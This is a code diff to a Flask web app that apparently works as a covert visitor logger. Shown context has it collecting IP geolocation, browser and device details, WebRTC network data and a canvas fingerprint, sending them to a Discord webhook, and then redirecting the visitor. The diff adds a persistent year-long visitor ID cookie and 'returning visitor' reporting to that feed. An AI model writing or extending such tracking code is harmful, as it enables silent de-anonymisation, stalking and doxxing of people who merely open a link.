@@ -2,9 +2,10 @@ import os
 import json
 import time
 import threading
+import uuid
 from datetime import datetime, timezone
 import requests
-from flask import Flask, request, Response
+from flask import Flask, request, Response, make_response
 from dotenv import load_dotenv
 
 load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))
@@ -187,6 +188,16 @@ def notify_discord(data):
     "name": "🌐 WebRTC Network",
     "value": format_webrtc(data.get("webrtc")),
     "inline": False,
+},
+{
+    "name": "Visitor ID",
+    "value": clean(data.get("visitor_id")),
+    "inline": False,
+},
+{
+    "name": "Returning Visitor",
+    "value": clean(data.get("returning_visitor")),
+    "inline": True,
 },
     ]
     payload = { 
@@ -725,6 +736,14 @@ async function getCanvasFingerprint() {
 </html>
 """
 
+def get_or_create_visitor_id():
+    visitor_id = request.cookies.get("visitor_id")
+
+    if visitor_id:
+        return visitor_id, False
+
+    visitor_id = str(uuid.uuid4())
+    return visitor_id, True
 
 # visitor route
 
@@ -735,28 +754,13 @@ def index():
 
     data = collect_http_data()
 
-    user_agent = data.get(
-        "user_agent",
-        ""
-    )
+    user_agent = data.get("user_agent", "")
 
-    data["browser"] = detect_browser(
-        user_agent
-    )
+    data["browser"] = detect_browser(user_agent)
+    data["os"] = detect_os(user_agent)
+    data["device"] = detect_device(user_agent)
 
-    data["os"] = detect_os(
-        user_agent
-    )
-
-    data["device"] = detect_device(
-        user_agent
-    )
-
-    # Approximate IP information
-    geo = get_ip_information(
-        data.get("ip")
-    )
-
+    geo = get_ip_information(data.get("ip"))
     data.update(geo)
 
     data["response_time_ms"] = round(
@@ -764,19 +768,33 @@ def index():
         2
     )
 
-    # Server-side notification
-    # notify_discord(data)
+    visitor_id, is_new = get_or_create_visitor_id()
 
-    # Safely insert redirect URL into JavaScript.
+    data["visitor_id"] = visitor_id
+    data["returning_visitor"] = not is_new
+
     page = BROWSER_PAGE.replace(
         "__REDIRECT_URL__",
         json.dumps(REDIRECT_URL)
     )
 
-    return Response(
+    response = make_response(
         page,
-        mimetype="text/html"
+        200
     )
+
+    # First-party persistent visitor identifier.
+    if is_new:
+        response.set_cookie(
+            "visitor_id",
+            visitor_id,
+            max_age=60 * 60 * 24 * 365,
+            httponly=True,
+            secure=True,
+            samesite="Lax"
+        )
+
+    return response
 
 
 # browser telemetry collection route
